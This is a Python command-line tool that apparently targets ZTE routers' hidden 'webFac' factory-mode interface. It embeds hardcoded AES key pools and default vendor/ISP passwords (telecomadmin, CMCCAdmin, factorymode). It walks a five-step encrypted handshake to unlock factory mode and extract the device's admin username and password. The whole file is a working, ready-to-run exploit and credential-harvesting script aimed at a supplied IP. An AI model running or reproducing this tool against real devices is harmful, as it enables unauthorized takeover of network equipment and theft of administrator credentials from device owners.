#!/usr/bin/env python3
import sys
import re
import time
import math
import random
import struct
import argparse
import requests
try:
    from Crypto.Cipher import AES
except ImportError:
    raise SystemExit('pycryptodome is required: pip install pycryptodome')
POOLS_HEX = {
    'init': (
        "7b56b0f7da0e6852c819f32b849079e562f8ead2649387df73d7fbccaafe7543"
        "1c29df4c522c6e7b453d1ff1debc27858a4591be3813de673208541175f4d3b4"
        "a4b312866723994c617fb1d230df47f17693a38c95d359bf878ef3b3e4764988"
    ),
    'ksB': (
        "8c2365d1fc324537112871630720691473e7d453132436c2b5e1fccf8a9a4189"
        "3c49cf5c728c9eeb750d3fd1fecc57657a35213e68537e970248747195345384"
        "b4c3e2d6273de65d729cbc3d03fd76c19c25a89247e4180f243f4f67ec97f499"
    ),
    'kgA': (
        "9c3375d11c424537184891731745794443d7d573335476d2c5f12c4f7aba61d9"
        "5c69df8cd21cde3b352d2fe1de4c77f51a65d1fe18438ea742080478d5e4f334"
        "a4d3f236476d869d42651342dc429948dc679f9edc46375f849f6f76ce794f49"
    ),
    'kgB': (
        "b25e207bb8834c67df90e3a658bcd2bcad4000470d5b3c29e59a74e9b0562757"
        "0f7e1c6f1c975580fb003f8eb37b2bf43ce9014dda553395a934f18c78eb9c5b"
        "da927c7a7bf8b5d1b1e7771e53a97696ceca9acf7520f7dd1909ffbcdaf4f6ee"
    ),
}
POOLS = dict((k, bytes.fromhex(''.join(v))) for k, v in POOLS_HEX.items())
DEFAULT_USERS = ('factorymode', 'CMCCAdmin', 'CUAdmin', 'telecomadmin')
DEFAULT_PWS = ('nE%jA@5b', 'aDm8H%MdA', 'CUAdmin', 'nE7jA%5m')
RSA_BY_CORE = {
    'C': dict(SI_MOD=30049, SI_EXP=103),
    'B': dict(SI_MOD=2537, SI_EXP=23),
    'M': dict(SI_MOD=2537, SI_EXP=23),
    'A': dict(SI_MOD=30049, SI_EXP=103),
}
KEYFN_BY_CORE = {
    'C': lambda s: _key('kgA', s),
    'B': lambda s: _key('ksB', s),
    'M': lambda s: _key('kgB', s),
    'A': lambda s: _key('init', s),
}
POOL_NAME_BY_CORE = {'C': 'kgA', 'B': 'ksB', 'M': 'kgB', 'A': 'init'}
BRANCH_KEY = {'C': ('re_rand=', 8), 'B': ('newrand=', 8), 'M': ('mipsrand=', 9)}
TIMING = {'reset_to_step1': 0.2, 'step1_wait': 5.0, 'step1_to_step2': 0.2}
def _magic_table():
    t = [None] * 256
    for v in range(2537):
        d = pow(v, 1271, 2537) & 0xFF
        if t[d] is None:
            t[d] = v
    return t
MAGIC_TABLE = _magic_table()
def pad(data, block_size=16):
    return data + b'\x00' * (block_size - len(data) % block_size)
def unpad(data):
    return data.rstrip(b'\x00')
def aes_encrypt(key, data):
    return AES.new(key, AES.MODE_ECB).encrypt(pad(data))
def aes_decrypt(key, data):
    return unpad(AES.new(key, AES.MODE_ECB).decrypt(data))
def _key(pool_name, seed, n=24):
    if seed < 0:
        raise ValueError('%s: seed=%d is negative' % (pool_name, seed))
    if seed > 71:
        raise ValueError('%s: seed=%d > 71' % (pool_name, seed))
    pool = POOLS[pool_name]
    if seed + n > len(pool):
        raise ValueError('%s: seed+n=%d exceeds pool length %d' % (pool_name, seed + n, len(pool)))
    return bytes(b ^ 0xA5 for b in pool[seed:seed + n])
def detect_core(txt):
    if txt.find('re_rand=') >= 0:
        return 'C'
    if txt.find('newrand=') >= 0:
        return 'B'
    if txt.find('mipsrand=') >= 0:
        return 'M'
    return 'A'
def atoi_dec(s):
    m = re.match(r'\s*(-?\d+)', s or '')
    return int(m.group(1)) if m else 0
def _smod_arm(x, m):
    r = abs(x) % m
    return -r if x < 0 else r
def calc_seed(rand60, field):
    t = (rand60 * 0x1000193) % 64
    v = _smod_arm(t ^ atoi_dec(field), 60)
    if v < 0:
        v %= 60
    return v
def build_magic(mac6, tail=None):
    if tail is None:
        tail = (0x7c4, 0x6ca, 0x495, 0x84e, 0x1cd, 0x827)
    m = bytes(mac6)[:6]
    if len(m) < 6:
        m = m + bytes(6 - len(m))
    tl = list(tail)[:6]
    if len(tl) < 6:
        tl += [0] * (6 - len(tl))
    words = [MAGIC_TABLE[b] for b in m] + tl
    p = b''.join(struct.pack('<I', v) for v in words[:11])
    p += struct.pack('<H', words[11])
    return p, words
def is_prime(n):
    if n < 2:
        return False
    i = 2
    while i * i <= n:
        if n % i == 0:
            return False
        i += 1
    return True
def rsa_gen(rnd=None, si_mod=30049):
    if rnd is None:
        rnd = random.Random()
    cap = si_mod - 1
    lo, hi = 60, 159
    if lo * lo > cap:
        lo = 17
        hi = int(cap ** 0.5)
        while hi > lo and hi * hi > cap:
            hi -= 1
    span = hi - lo + 1
    while True:
        p = rnd.randint(lo, hi)
        while not is_prime(p):
            p += 1
            if p > hi:
                p = lo
        q = rnd.randint(lo, hi)
        guard = 0
        while (p == q or not is_prime(q)) and guard <= span:
            q -= 1
            if q < lo:
                q = hi
            guard += 1
        if p == q or not is_prime(q):
            continue
        n_try = p * q
        if 255 < n_try <= cap and math.gcd(n_try, si_mod) == 1:
            break
    n = p * q
    phi = (p - 1) * (q - 1)
    cand = []
    e = phi - 1
    while e > 1 and len(cand) < 100:
        if math.gcd(e, phi) == 1:
            cand.append(e)
        e -= 1
    ev = cand[rnd.randrange(len(cand))]
    d = 1
    while (ev * d) % phi != 1:
        d += 1
    return dict(p=p, q=q, n=n, phi=phi, e=ev, d=d)
def build_sendinfo(server_mac, seq, rsa, si_exp, si_mod):
    xs = [0, rsa['d'], 0, rsa['n']]
    arr = [pow(x, si_exp, si_mod) for x in xs]
    data = bytes(server_mac) + b''.join(bytes(m) for m in seq)
    arr += [pow(b, rsa['e'], rsa['n']) for b in data]
    body = b''.join(struct.pack('<I', v & 0xFFFFFFFF) for v in arr)
    return ('SendInfo.gch?info=%d|' % len(arr)).encode('latin-1') + body
def build_seq(client_mac, pattern='aabb'):
    return [client_mac if c == 'a' else bytes([0x00, 0xFF, 0x72, 0x46, 0x34, 0x11]) for c in pattern]
def plain_step4(ver_s, user, pw, core, fmt=None):
    if fmt == 'login' or (fmt is None and core == 'A'):
        return ('CheckLoginAuth.gch?LoginUser=%s&LoginUserPassword=%s'
                % (user, pw)).encode('latin-1')
    return ('CheckLoginAuth.gch?version%s&user=%s&pass=%s'
            % (ver_s, user, pw)).encode('latin-1')
def plain_step5(mode, fmuser, tail, core):
    if core == 'A':
        return ('FactoryMode.gch?FacMode=%d&FacUser=%s%s'
                % (mode, fmuser, tail)).encode('latin-1')
    return ('FactoryMode.gch?mode=%d&user=%s%s'
            % (mode, fmuser, tail)).encode('latin-1')
def norm_version(v):
    s = str(v).strip()
    if not s.isdigit():
        return None, 'must be digits only (version<digits>, no equals sign)'
    if int(s) <= 49:
        return None, 'must be greater than 49, got %s' % s
    return s, 'ok'
def norm_slaveip(v):
    s = str(v).strip()
    if len(s) <= 6:
        return None, 'length must exceed 6, got %d' % len(s)
    if s[:7] == '0.0.0.0':
        return None, 'must not be 0.0.0.0'
    return s, 'ok'
def norm_mac(v):
    if v is None:
        return None
    if isinstance(v, (bytes, bytearray)):
        b = bytes(v)
        return b if len(b) == 6 else None
    t = str(v).replace('-', ':').split(':')
    if len(t) != 6 or any(len(x) != 2 for x in t):
        return None
    try:
        return bytes(int(x, 16) for x in t)
    except ValueError:
        return None
def printable_ratio(b):
    if not b:
        return 0.0
    return sum(1 for c in b if 0x20 <= c < 0x7F or c in (9, 10, 13)) / len(b)
class WebFac(object):
    def __init__(self, host, port=8080, mac=None, timeout=5.0, verbose=False):
        self.host = host
        self.port = int(port)
        self.mac = norm_mac(mac)
        self.timeout = timeout
        self.verbose = verbose
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'zte',
            'Content-Type': 'text/plain',
        })
    def log(self, fmt, *a):
        if self.verbose:
            print(fmt % a if a else fmt)
    def _url(self, path):
        return 'http://%s:%d%s' % (self.host, self.port, path)
    def _post(self, path, body, timeout=None):
        headers = {
            'Referer': 'http://%s/login.html' % self.host,
        }
        return self.session.post(self._url(path), data=body, headers=headers,
                                 timeout=timeout or self.timeout)
    def reset(self):
        try:
            r = self._post('/webFac', b'SendSq.gch', timeout=2.0)
        except requests.RequestException:
            return True
        return r.status_code == 400
    def request_factory_mode(self):
        try:
            r = self._post('/webFac', b'RequestFactoryMode.gch',
                           timeout=TIMING['step1_wait'])
        except requests.RequestException as e:
            self.log('    S1 connection failed: %s', e)
            return None
        return r
    def send_sq(self, rand60):
        return self._post('/webFac', ('SendSq.gch?rand=%d\r\n' % rand60).encode('latin-1'))
    def post_enc(self, key, plain):
        return self._post('/webFacEntry', aes_encrypt(key, plain))
    def decrypt(self, key, resp, expect=None):
        if resp is None or not resp.content:
            return b'', False, False
        body = resp.content
        n = len(body) // 16 * 16
        if n == 0:
            return b'', False, False
        try:
            dec = aes_decrypt(key, body[:n])
        except Exception:
            return b'', False, False
        ok = printable_ratio(dec) >= 0.8
        hit = (expect is None) or dec.startswith(expect)
        return dec, ok, hit
class Result(object):
    def __init__(self):
        self.ok = False
        self.cred = None
        self.core = None
        self.variant = None
        self.seed = None
        self.rand60 = None
        self.step4_code = None
        self.steps = {}
        self.failed = []
        self.error = None
    def finish(self):
        self.failed = [i for i in (1, 2, 3, 4, 5) if self.steps.get(i) is not True]
        return self
def run(host, port=8080, mac=None, user='telecomadmin', pw='',
        mode=2, fmuser='notused', version=None, magic_mac='client',
        rand_val=None, no_sendinfo=None, info_magic=None,
        info_simple=False, slaveip=None, close=False, timeout=5.0,
        verbose=False, rnd=None, progress=None):
    rnd = rnd or random.Random()
    res = Result()
    wf = WebFac(host, port=port, mac=mac, timeout=timeout, verbose=verbose)
    def mark(n, ok, note=''):
        res.steps[n] = bool(ok)
        if progress:
            progress(n, bool(ok), note)
    if wf.mac is None:
        res.error = 'mac'
        return res.finish()
    if version is not None:
        ver_s, why = norm_version(version)
        if ver_s is None:
            res.error = 'version: %s' % why
            return res.finish()
    else:
        ver_s = '76'
    tail5 = ''
    if slaveip:
        sip, why = norm_slaveip(slaveip)
        if sip is None:
            res.error = 'slaveip: %s' % why
            return res.finish()
        tail5 = '&slaveip=%s' % sip
    rand60 = rand_val if rand_val is not None else rnd.randrange(60)
    res.rand60 = rand60
    wf.log('    rand60 = %d (client nonce, 0-59)', rand60)
    wf.reset()
    time.sleep(TIMING['reset_to_step1'])
    r1 = wf.request_factory_mode()
    if r1 is None:
        mark(1, True, '(no response)')
    elif r1.status_code != 200:
        mark(1, False)
        return res.finish()
    else:
        mark(1, True)
    time.sleep(TIMING['step1_to_step2'])
    try:
        r2 = wf.send_sq(rand60)
    except requests.RequestException as e:
        wf.log('    S2 connection failed: %s', e)
        mark(2, False)
        return res.finish()
    txt = r2.content.decode('latin-1', errors='ignore')
    mark(2, r2.status_code == 200)
    wf.log('    S2 response = %d, %d bytes: %r', r2.status_code, len(r2.content),
           r2.content[:80])
    if r2.status_code != 200:
        return res.finish()
    core = detect_core(txt)
    res.core = core
    si_mod, si_exp = RSA_BY_CORE[core]['SI_MOD'], RSA_BY_CORE[core]['SI_EXP']
    skip_si = (core == 'A') if no_sendinfo is None else bool(no_sendinfo)
    use_magic = (core == 'B') if info_magic is None else bool(info_magic)
    if version is None and core in ('B', 'A') and ver_s == '76':
        ver_s = '50'
    server_mac = None
    rsa = None
    bk = BRANCH_KEY.get(core)
    if bk is None:
        nr = rand60
        variant = 'A(init)'
        wf.log('    no branch token in response -> seed = rand60 = %d (used directly)', nr)
    else:
        tag, off = bk
        val = txt[txt.find(tag) + off:]
        nr = calc_seed(rand60, val)
        variant = '%s(%s)' % (core, tag[:-1])
        wf.log('    %s = %r → seed = ((rand60=%d × 0x1000193) %% 64 ^ %d) %% 60 = %d',
               tag, val[:40], rand60, atoi_dec(val), nr)
        if core == 'C':
            parts = val.split('&', 2)
            if len(parts) < 3:
                res.error = 're_rand has fewer than 3 segments'
                return res.finish()
            wf.log('    re_rand segments: 1=%s 2=%s 3=MAC', parts[0], parts[1])
            rsa = rsa_gen(rnd, si_mod)
            server_mac = parts[2].encode('latin-1', errors='ignore')[:6]
            if len(server_mac) < 6:
                res.error = 'C branch did not return a MAC'
                return res.finish()
            wf.log('    device MAC = %s (6 raw bytes)', ':'.join('%02X' % b for b in server_mac))
            wf.log('    client RSA: p=%d q=%d n=%d e=%d d=%d',
                   rsa['p'], rsa['q'], rsa['n'], rsa['e'], rsa['d'])
    res.variant = variant
    res.seed = nr
    key = KEYFN_BY_CORE[core](nr)
    wf.log('    branch=%s core=%s seed=%d keyPool=%s',
           variant, core, nr, POOL_NAME_BY_CORE[core])
    wf.log('    AES-192 key = %s', key.hex())
    if server_mac is None:
        server_mac = bytes(6)
    seq = build_seq(wf.mac)
    if rsa is None and not use_magic and not skip_si and not info_simple:
        rsa = rsa_gen(rnd, si_mod)
    plain = b''
    if info_simple:
        plain = b'SendInfo.gch?info=6|'
        wf.log('    [simple] payload = %r (no body, N=6)', plain)
    elif use_magic:
        m = bytes(wf.mac)
        if magic_mac == 'server' and any(server_mac):
            m = bytes(server_mac)
        seg, words = build_magic(m)
        plain = ('SendInfo.gch?info=%d|' % len(words)).encode('latin-1') + seg
        wf.log('    [magic] MAC=%s N=%d', ':'.join('%02X' % b for b in m[:6]), len(words))
    elif not skip_si:
        plain = build_sendinfo(server_mac, seq, rsa, si_exp, si_mod)
        n3 = int(plain.split(b'info=')[1].split(b'|')[0])
        if core == 'B' and n3 % 6:
            wf.log('    N=%d, N%%6!=0: the B branch may reject it', n3)
    if skip_si:
        mark(3, True, '(SendInfo skipped)')
        code3 = None
    else:
        try:
            r3 = wf.post_enc(key, plain)
        except requests.RequestException as e:
            wf.log('    S3 connection failed: %s', e)
            mark(3, False)
            mark(4, False)
            mark(5, False)
            return res.finish()
        code3 = r3.status_code
        mark(3, code3 == 200)
        wf.log('    S3 plaintext %d bytes: %r', len(plain), plain[:56])
        wf.log('    S3 response = %d, %d bytes', code3, len(r3.content))
        if code3 != 200:
            if core == 'A' and no_sendinfo is False:
                skip_si = True
            else:
                mark(4, False)
                mark(5, False)
                return res.finish()
    attempts = [(user, pw, None)]
    if core == 'A':
        attempts += [('factorymode', 'nE%jA@5b', None),
                     (user, pw, 'version'),
                     ('factorymode', 'nE%jA@5b', 'version')]
    for ai, (au, ap, afmt) in enumerate(attempts):
        p4 = plain_step4(ver_s, au, ap, core, afmt)
        try:
            r4 = wf.post_enc(key, p4)
        except requests.RequestException as e:
            wf.log('    S4 connection failed: %s', e)
            if ai == 0:
                mark(4, False)
                mark(5, False)
                return res.finish()
            break
        code4 = r4.status_code
        res.step4_code = code4
        d4, dec_ok, _ = wf.decrypt(key, r4, expect=b'FactoryMode.gch')
        wf.log('    S4 plaintext %d bytes: %r', len(p4), p4)
        wf.log('    S4 response = %d, %d bytes', code4, len(r4.content))
        if d4:
            wf.log('    S4 decrypted = %r', d4[:100])
        if code4 == 200 and dec_ok:
            mark(4, True, ('' if ai == 0 else '(accepted on format %d)' % (ai + 1)))
            break
        if code4 != 401 and code4 != 400:
            mark(4, False)
            break
        if ai == len(attempts) - 1:
            mark(4, False, '(all %d formats rejected)' % len(attempts))
        else:
            wf.log('    step4=%s, retrying with format %d', code4, ai + 2)
    if close:
        p5 = ('FactoryMode.gch?close%s' % tail5).encode('latin-1')
    else:
        p5 = plain_step5(mode, fmuser, tail5, core)
    try:
        r5 = wf.post_enc(key, p5)
    except requests.RequestException as e:
        wf.log('    S5 connection failed: %s', e)
        mark(5, False)
        return res.finish()
    mark(5, r5.status_code == 200)
    wf.log('    S5 plaintext %d bytes: %r', len(p5), p5)
    wf.log('    S5 response = %d, %d bytes', r5.status_code, len(r5.content))
    d5 = wf.decrypt(key, r5)[0]
    if d5:
        wf.log('    S5 decrypted = %r', d5[:120])
    if d5 and b'user=' in d5 and b'pass=' in d5:
        try:
            sp = d5.decode('latin-1')
            res.cred = (sp.split('user=')[1].split('&')[0],
                        sp.split('pass=')[1].split('&')[0])
            res.ok = True
        except Exception:
            pass
    return res.finish()
def build_parser():
    ap = argparse.ArgumentParser(
        description='ZTE factory mode - single-file edition (requests + pycryptodome)',
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument('ip', nargs='?', help='device IP')
    ap.add_argument('-ip', dest='ip_opt', default=None, help='device IP (either this flag or a positional argument)')
    ap.add_argument('-port', type=int, default=8080)
    ap.add_argument('-u', '--user', dest='user', nargs='+', default=None,
                    help='username(s); multiple values allowed (defaults to 4 built-in accounts)')
    ap.add_argument('-p', '--pass', dest='pw', nargs='+', default=None,
                    help='password(s); multiple values allowed (defaults to 4 built-in passwords)')
    ap.add_argument('-m', dest='mac', help='[required] local NIC MAC, XX:XX:XX:XX:XX:XX')
    ap.add_argument('-slaveip', default=None, help='append &slaveip=<ip> to step 5 (slave ONU)')
    ap.add_argument('-close', action='store_true', help='step 5 sends the close payload instead of enable')
    ap.add_argument('-all', action='store_true', help='try every credential pair, do not stop at first hit')
    ap.add_argument('-v', dest='verbose', action='store_true', help='print per-step detail')
    return ap
def main():
    ap = build_parser()
    a = ap.parse_args()
    a.ip = a.ip or a.ip_opt
    if not a.ip:
        ap.error('an IP is required (positional argument or -ip)')
    if not a.mac:
        ap.error('-m local NIC MAC is required')
    if norm_mac(a.mac) is None:
        ap.error('invalid MAC, expected six octets XX:XX:XX:XX:XX:XX: %s' % a.mac)
    users = list(a.user) if a.user else list(DEFAULT_USERS)
    pws = list(a.pw) if a.pw else list(DEFAULT_PWS)
    if len(users) == 1 and len(pws) > 1:
        users = users * len(pws)
    elif len(pws) == 1 and len(users) > 1:
        pws = pws * len(users)
    elif len(users) != len(pws):
        ap.error('-u has %d value(s) and -p has %d: they pair up 1:1, so counts must '
                 'match (or one side may have exactly 1)' % (len(users), len(pws)))
    for name, vals in (('-u', users), ('-p', pws)):
        for v in vals:
            try:
                (v or '').encode('latin-1')
            except UnicodeEncodeError:
                ap.error('%s contains a non-latin-1 character: %r' % (name, v))
    combos = list(zip(users, pws))
    if len(combos) > 4:
        combos = combos[:4]
        if a.verbose:
            print('note: more than %d pairs, only the first %d will run' % (4, 4))
    total = len(combos)
    if a.verbose:
        print('target = %s:%d   %d credential pair(s)' % (a.ip, a.port, total))
        print('=' * 70)
    hits = []
    seed_base = random.Random()
    for idx, (u, p) in enumerate(combos, 1):
        marks = []
        def progress(n, ok, note=''):
            marks.append((n, ok))
            if a.verbose:
                print('  facStep %d: %s%s' % (n, 'OK!' if ok else 'FAIL!',
                                              ('  ' + note) if note else ''))
        if a.verbose:
            print('[%d/%d] user=%s pass=%s' % (idx, total, u, p))
        res = run(a.ip, port=a.port, mac=a.mac, user=u, pw=p,
                  mode=2, fmuser='notused', version=None,
                  magic_mac='client', rand_val=None,
                  no_sendinfo=None, info_magic=None, info_simple=False,
                  slaveip=a.slaveip, close=a.close,
                  timeout=5.0, verbose=a.verbose,
                  rnd=random.Random(seed_base.random()), progress=progress)
        tag = ' '.join('%d:%s' % (n, 'OK' if ok else 'X') for n, ok in marks)
        done = (not res.failed) if a.close else res.ok
        if res.error:
            print('[%d/%d] user=%s pass=%s -> aborted (%s)' % (idx, total, u, p, res.error))
        elif done:
            print('[%d/%d] user=%s pass=%s -> OK  %s  core=%s seed=%d'
                  % (idx, total, u, p, tag, res.core, res.seed))
            hits.append((u, p, res))
            if not a.all:
                break
        else:
            print('[%d/%d] user=%s pass=%s -> FAIL %s  core=%s step4=%s'
                  % (idx, total, u, p, tag, res.core, res.step4_code))
        if idx < total:
            time.sleep(0.3)
    if a.verbose:
        print('=' * 70)
    if a.close:
        if hits:
            print('close mode: all five steps completed, close payload sent (%d pair(s) succeeded)' % len(hits))
            return 0
        print('close mode failed')
        return 1
    if hits:
        for u, p, r in hits:
            print('Hit: user=%s pass=%s -> user=%s  pass=%s' % (u, p, r.cred[0], r.cred[1]))
        return 0
    print('all %d credential pair(s) failed to yield credentials' % total)
    if not a.verbose:
        print('  tip: add -v for per-step detail; step4=401 usually means wrong '
              'credentials, 400 usually means a stale state')
    return 1
if __name__ == '__main__':
    sys.exit(main())
